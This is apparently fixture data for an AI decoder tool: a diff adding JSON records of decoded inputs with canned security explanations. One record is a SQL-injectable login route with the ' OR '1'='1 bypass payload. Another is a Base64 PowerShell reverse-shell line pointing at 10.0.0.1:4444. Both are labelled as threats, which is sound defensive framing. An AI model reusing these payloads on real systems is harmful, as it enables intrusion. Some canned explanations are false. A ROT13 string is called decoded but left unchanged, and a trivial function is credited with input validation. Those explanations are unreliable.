+    "isBookmarked": false,
+    "tags": [
+      "jwt",
+      "auth",
+      "tokens"
+    ],
+    "createdAt": "2026-11-24T17:40:10.877Z",
+    "updatedAt": "2026-11-24T17:40:10.877Z",
+    "decoderType": "jwt",
+    "rawInput": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJvcGVyYXRvcl8wMDciLCJyb2xlIjoiYWRtaW4iLCJpc3MiOiJhaS1kZWNvZGVyLW5vZGUiLCJleHAiOjE3ODQ4NTY5OTl9.signature_hash_preview",
+    "decodedOutput": "{\n  \"header\": {\n    \"alg\": \"HS256\",\n    \"typ\": \"JWT\"\n  },\n  \"payload\": {\n    \"sub\": \"operator_007\",\n    \"role\": \"admin\",\n    \"iss\": \"ai-decoder-node\",\n    \"exp\": 1784856999\n  },\n  \"status\": {\n    \"isExpired\": false,\n    \"algorithm\": \"HS256\"\n  }\n}",
+    "aiExplanation": {
+      "summary": "Cryptographic JSON Web Token issuing administrative credentials to operator_007.",
+      "breakdown": [
+        "Signed using HMAC-SHA256 (HS256) symmetric algorithm.",
+        "Carries administrative role privileges with extended validity period.",
+        "Payload claims adhere to RFC 7519 standards."
+      ],
+      "securityAudit": "SECURE: Valid claims structure. Ensure HS256 secret key entropy is > 256 bits.",
+      "complexity": "RFC 7519 Compliant Token",
+      "detectedFormat": "JSON Web Token (JWT)"
+    },
+    "metadata": {
+      "language": "jwt",
+      "executionTimeMs": 3
+    }
+  },
+  {
+    "id": "fda2b59e-0833-4897-8773-d0b42f20579d",
+    "_id": "fda2b59e-0833-4897-8773-d0b42f20579d",
+    "isBookmarked": true,
+    "tags": [
+      "cwe-89",
+      "owasp",
+      "vulnerability"
+    ],
+    "createdAt": "2026-11-24T17:40:10.875Z",
+    "updatedAt": "2026-11-24T17:40:10.875Z",
+    "decoderType": "code",
+    "rawInput": "app.post('/api/authenticate', async (req, res) => {\n  const { user, pass } = req.body;\n  const sql = \"SELECT * FROM operators WHERE username = '\" + user + \"' AND password = '\" + pass + \"'\";\n  const result = await db.query(sql);\n  res.json(result);\n});",
+    "decodedOutput": "Express.js authentication route vulnerable to CWE-89 SQL Injection via unparameterized string concatenation.",
+    "aiExplanation": {
+      "summary": "Express.js authentication handler with critical SQL Injection vulnerability.",
+      "breakdown": [
+        "Direct string concatenation of user and pass variables into raw SQL query.",
+        "Allows authentication bypass using payload: ' OR '1'='1.",
+        "Remediation: Use parameterized queries or ORM bindings (e.g. SELECT * FROM operators WHERE username = ?)."
+      ],
+      "securityAudit": "VULNERABILITY: CWE-89 SQL Injection (OWASP Top 10 - A03:2021).",
+      "complexity": "Time Complexity: O(1) query dispatch | Space: O(1)",
+      "detectedFormat": "Node.js Express Handler"
+    },
+    "metadata": {
+      "language": "javascript",
+      "executionTimeMs": 22
+    }
+  },
+  {
+    "id": "686b8e5e-4417-4034-83d0-a737bd9d302b",
+    "_id": "686b8e5e-4417-4034-83d0-a737bd9d302b",
+    "isBookmarked": true,
+    "tags": [
+      "security",
+      "malware",
+      "powershell"
+    ],
+    "createdAt": "2026-11-24T17:40:10.873Z",
+    "updatedAt": "2026-11-24T17:40:10.873Z",
+    "decoderType": "text",
+    "rawInput": "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADAALgAxACIALAA0ADQANAA0ACkAOwA=",
+    "decodedOutput": "$client = New-Object System.Net.Sockets.TCPClient(\"10.0.0.1\",4444);",
+    "aiExplanation": {
+      "summary": "Decoded Base64 Unicode payload revealing a PowerShell reverse TCP shell connection.",
+      "breakdown": [
+        "Instantiates a .NET TCPClient object targeting IP 10.0.0.1 on port 4444.",
+        "Standard reverse-shell initiation signature commonly observed in red-team exercises.",
+        "Obfuscated using UTF-16LE encoding."
+      ],
+      "securityAudit": "CRITICAL THREAT: Unauthorized reverse-shell network beacon.",
+      "complexity": "Entropy Level: High (Obfuscated Base64 PowerShell)",
+      "detectedFormat": "PowerShell Reverse Shell Script"
+    },
+    "metadata": {
+      "language": "powershell",
+      "executionTimeMs": 14
+    }
+  },
+  {
+    "id": "1de5b10e-2fe2-47a1-b4a8-ed130a0d0507",
+    "_id": "43697820-5d68-4e13-b0d0-42e1255907f6",
+    "isBookmarked": false,
+    "createdAt": "2026-11-24T16:26:37.339Z",
+    "userId": "15f9faf5-3fd3-4b74-8aa4-85a1fecf4c90",
+    "decoderType": "code",
+    "rawInput": "function add(a, b) { return a + b; }",
+    "decodedOutput": "Analyzed javascript block: performs logical transformations, input validation, and structural flow.",
+    "aiExplanation": {
+      "summary": "Analyzed javascript block: performs logical transformations, input validation, and structural flow.",
+      "breakdown": [
+        "Identified language paradigm: javascript.",
+        "Variable scoping and boundary conditions appear structurally sound.",
+        "No direct memory leaks or synchronous blocking loops observed."
+      ],
+      "securityAudit": "SECURE: Clean code structure without known OWASP Top-10 signature matches.",
+      "complexity": "Time Complexity: ~O(N) | Space Complexity: ~O(1)",
+      "detectedFormat": "JAVASCRIPT Source"
+    },
+    "metadata": {
+      "language": "javascript",
+      "executionTimeMs": 0
+    }
+  },
+  {
+    "id": "55c8ef5b-398b-4a6e-83ab-93928c182329",
+    "_id": "c6abc881-b61c-4585-a244-829f4c805040",
+    "isBookmarked": false,
+    "createdAt": "2026-11-24T16:26:37.326Z",
+    "userId": "15f9faf5-3fd3-4b74-8aa4-85a1fecf4c90",
+    "decoderType": "text",
+    "rawInput": "Gur frperg cnffjbeq vf 'CYBER-2026'",
+    "decodedOutput": "Gur frperg cnffjbeq vf 'CYBER-2026'",
+    "aiExplanation": {
+      "summary": "Decoded semantic contents. The input represents an encoded cryptographic or serialized structure.",
+      "breakdown": [
+        "Input length: 35 characters | Output length: 35 characters.",
+        "Semantic structure translated into plain, readable conversational English.",
+        "Identified key concepts and stripped extraneous protocol markers."
+      ],
+      "securityAudit": "CLEAN: No injection or exploit payload patterns identified.",
+      "complexity": "Entropy Level: Low-to-Medium",
+      "detectedFormat": "Standard Text String"
+    },
+    "metadata": {
+      "language": "text",
+      "executionTimeMs": 1
+    }
+  },
+  {
+    "id": "d91c26f9-ddc1-4b56-8024-30c5212e46df",
+    "_id": "54d44370-6080-419d-894b-48f4ccff6ce3",
+    "isBookmarked": false,
+    "createdAt": "2026-11-24T16:17:40.318Z",
+    "userId": null,
+    "decoderType": "cipher",
+    "rawInput": "SGVsbG8gQUkgREVDT0RFUiE=",
+    "decodedOutput": "Hello AI DECODER!",
+    "aiExplanation": {
+      "summary": "Decoded semantic contents. The input represents an encoded cryptographic or serialized structure.",
+      "breakdown": [
+        "Input length: 24 characters | Output length: 17 characters.",
+        "Semantic structure translated into plain, readable conversational English.",
+        "Identified key concepts and stripped extraneous protocol markers."
+      ],
+      "securityAudit": "CLEAN: No injection or exploit payload patterns identified.",
+      "complexity": "Entropy Level: Low-to-Medium",
+      "detectedFormat": "Base64"
+    },
+    "metadata": {
+      "language": "base64",
+      "executionTimeMs": 0
+    }
+  }
+]
